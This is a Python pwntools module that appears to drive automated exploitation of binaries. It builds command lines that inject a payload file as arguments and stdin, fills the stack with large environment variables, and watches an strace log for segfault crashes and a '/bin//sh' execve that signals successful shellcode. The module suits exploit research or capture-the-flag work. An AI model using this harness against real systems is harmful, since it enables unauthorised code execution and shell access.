from pwn import *
from utils import *

log_file_path = 'strace.log'

env_vars = {
    "VAR1": "A" * 131000,
    "VAR2": "B" * 131000,
    "VAR3": "C" * 131000,
    "VAR4": "D" * 131000,
    "VAR5": "E" * 131000,
    "VAR6": "F" * 131000,
    "VAR7": "G" * 131000,
    "VAR8": "H" * 131000,
    "VAR9": "I" * 131000,
    "VAR10": "J" * 131000,
    "VAR11": "K" * 131000,
    "VAR12": "L" * 131000,
    "VAR13": "M" * 131000,
    "VAR14": "N" * 131000,
}

def build_command(target_bin, args):
    input = 'cat payload - | '
    pairs = [(args[i], args[i+1]) for i in range(0, len(args), 2)]
    target_bin = f'/mnt/binaries/{target_bin}'

    command = [target_bin]

    for arg, pos in pairs:
        pos = int(pos)
        if arg == 'payload':
            arg = '`cat payload`'
        command.insert(pos, arg)
    command.append('`cat payload`')

    exploit_command = ' '.join(command)
    exploit_command = input + exploit_command
    # print(exploit_command)

    return exploit_command


def detect_crash(pid: int):
    pid_str = str(pid)

    # pattern to detect the SIGCHLD signal with a SIGSEGV e.g. SIGCHLD {si_signo=SIGCHLD, si_code=CLD_DUMPED, si_pid=15595, si_uid=0, si_status=SIGSEGV, si_utime=0, si_stime=3}
    pattern = re.compile(
        rf"{pid_str}.*SIGCHLD.*si_status=SIGSEGV"
        # rf"{ppid_str}.*SIGCHLD.*si_pid={pid_str}.*si_status=(139|[^,]*SIGSEGV)" => THis line occurs after the exploit process terminates, right now the exploit proc is still running
    )

    try:
        with open(log_file_path, 'r') as log_file:
            lines = log_file.readlines()

            for line in lines:

                if pattern.search(line):
                    return True

    except FileNotFoundError:
        print(f"Log file '{log_file_path}' not found.")
        cleanup()
    except Exception as e:
        print(f"An error occurred while reading the log file: {e}")
        cleanup()

    return False


def detect_execve():
    pattern = re.compile(
        r"\d+\s+execve\(\"/bin//sh\", NULL, NULL\)\s+=\s+0"
    )

    try:
        with open(log_file_path, 'r') as log_file:
            lines = log_file.readlines()
            for line in lines:
                if pattern.search(line):
                    return True

    except FileNotFoundError:
        print(f"Log file '{log_file_path}' not found.")
        cleanup(1)
    except Exception as e:
        print(f"An error occurred while reading the log file: {e}")
        cleanup(1)

    return False

def shell(exploit_proc):
    drain_fd(exploit_proc.proc.stdout.fileno())
    exploit_proc.interactive()
    exploit_proc.close()
    cleanup(0)

def run_exploit(exploit_cmd):

    #passing on 2MB of env vars to fill up the stack
    exploit_proc = process(exploit_cmd, shell=True, stdin=PTY, stdout=PTY, stderr=PTY, raw=False, env=env_vars)
    exploit_proc.sendline()
    return exploit_proc